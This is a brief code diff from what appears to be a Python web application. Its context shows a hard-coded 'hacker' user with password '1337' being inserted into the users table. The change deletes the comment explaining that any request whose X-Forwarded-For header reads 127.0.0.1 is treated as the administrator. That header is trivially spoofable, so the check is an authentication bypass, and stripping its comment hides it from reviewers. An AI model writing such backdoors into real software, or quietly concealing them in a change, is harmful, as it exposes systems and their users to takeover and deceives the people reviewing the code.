@@ -41,7 +41,6 @@ db.execute("""INSERT INTO users SELECT "hacker" AS username, "1337" AS password"
 
 
 def current_user():
-    # Requests proxied from the internal network are trusted as the administrator.
     if request.headers.get("X-Forwarded-For") == "127.0.0.1":
         return "admin"
     return session.get("username")
